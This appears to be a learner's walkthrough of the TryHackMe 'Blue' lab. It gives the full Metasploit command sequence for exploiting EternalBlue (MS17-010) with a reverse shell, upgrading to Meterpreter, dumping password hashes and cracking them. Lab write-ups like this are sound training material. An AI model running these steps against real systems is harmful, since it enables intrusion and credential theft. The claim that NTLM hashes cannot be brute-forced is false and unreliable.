# Blue — TryHackMe
**Date:** 2026-05-19
**Difficulty:** Easy
**Category:** Exploitation / Post-Exploitation
**Status:** ✅ Completed

---

## Summary
Blue is a Windows machine vulnerable to EternalBlue (MS17-010), the same exploit behind the WannaCry ransomware attack. We identify the vulnerability through nmap and a Metasploit scanner, exploit it to gain a shell, upgrade to Meterpreter, dump password hashes, crack them using rainbow tables, and hunt down three flags across the system.

---

## Enumeration

### Ping
First step I do is ping the machine, this is to make sure I have the VPN setup and the target machine is online:
```
ping <target_ip>
```
Got a response from the server — lets move into the recon phase.

### Nmap
Next we run nmap to check for open ports and service versions:
```
nmap -sV <target_ip>
```
The `-sV` flag gives us the service version, which is useful to understand what type of machine we could be working with as well as what versions may be exploitable.

After running nmap, I discover a bunch of Microsoft Windows ports open. Specifically port **445** — and since the room is called Blue, this is almost certainly vulnerable to EternalBlue.

> EternalBlue exploits a vulnerability in Microsoft's implementation of the SMB protocol (CVE-2017-0144). The vulnerability exists because SMBv1 mishandles specially crafted packets from remote attackers, allowing them to remotely execute code on the target machine. It's the same exploit behind the WannaCry ransomware attack.
> Source: [Wikipedia — EternalBlue](https://en.wikipedia.org/wiki/EternalBlue)

---

## Foothold

### Launching Metasploit
Next we launch Metasploit — this is how we will gain access to the machine:
```
msfconsole
```

### Confirming the Vulnerability
Before attacking, I confirm EternalBlue is the right vulnerability by running a Metasploit scanner:
```
use auxiliary/scanner/smb/smb_ms17_010
options
set RHOSTS <target_ip>
run
```
The scanner returns that the host is very likely vulnerable to EternalBlue. Lets move to the attack.

### Running the Exploit
Load up the exploit:
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set payload windows/x64/shell/reverse_tcp
```

The exploit failed the first time — I checked my LHOST and the IP wasn't right. Fixed it by setting it to the VPN interface:
```
set LHOST tun0
exploit
```
This worked and I got access into the shell.

---

## Post-Exploitation

### Upgrading Shell to Meterpreter
A basic shell is limited — we want Meterpreter for more control. Used the shell to Meterpreter upgrade module:
```
use multi/manage/shell_to_meterpreter
set LHOST tun0
set SESSION 1
run
```
Had a few bugs with the exploit being a little slow but eventually got in. Ran `whoami` to confirm:
```
whoami
```
We are SYSTEM inside Windows.

### Process Migration
We run `ps` to list processes. Our goal is to migrate to a process running as `NT AUTHORITY\SYSTEM`. Found the PowerShell process at PID 3040 and migrated to it:
```
ps
migrate 3040
```
Now we are fully stable inside a privileged process.

### Hash Dumping
With the right privileges we can dump all password hashes on the system:
```
hashdump
```
This returns hashes for all users on the machine — including a user named **Jon**.

> **Note:** These passwords are hashed in NTLM, which is mathematically impossible to brute force directly. Instead we use rainbow tables — precomputed lists of passwords already hashed into NTLM — to match and reverse the hash back to plaintext.

Cracked Jon's hash using [CrackStation](https://crackstation.net/) and obtained his password.

---

## Flags

### Flag 1
The hint points to system root — the C drive in Windows:
```
cd c:\\
ls
cat flag1.txt
```
**Flag 1:** ✅ Obtained

### Flag 2
The hint says flag 2 is where Windows stores passwords. After a quick Google search, navigated to the config folder in System32:
```
cd C:\\Windows\\System32\\config
ls
cat flag2.txt
```
**Flag 2:** ✅ Obtained

### Flag 3
More ambiguous hint — used search to find it rather than guess:
```
search -f flag3.txt
```
The search returned that it's in Jon's Documents folder:
```
cd C:\\Users\\Jon\\Documents
cat flag3.txt
```
**Flag 3:** ✅ Obtained

---

## Key Takeaways
- Always confirm a vulnerability with a scanner before running an exploit — don't just assume
- If an exploit fails, check your LHOST first — `tun0` is the right interface when using TryHackMe/HTB VPN
- Upgrading from a basic shell to Meterpreter gives you significantly more post-exploitation capability
- NTLM hashes can't be cracked mathematically — rainbow tables are the practical approach for common passwords
- `search -f` in Meterpreter is a fast way to hunt for files without manually navigating the whole filesystem

---

## Tools Used
| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `msfconsole` | Metasploit framework |
| `auxiliary/scanner/smb/smb_ms17_010` | EternalBlue vulnerability confirmation |
| `exploit/windows/smb/ms17_010_eternalblue` | EternalBlue exploitation |
| `multi/manage/shell_to_meterpreter` | Shell upgrade |
| `hashdump` | Password hash extraction |
| CrackStation | NTLM hash cracking via rainbow tables |

---

## References
- [EternalBlue — Wikipedia](https://en.wikipedia.org/wiki/EternalBlue)
- [CrackStation](https://crackstation.net/)
- [CVE-2017-0144](https://www.cvedetails.com/cve/CVE-2017-0144/)
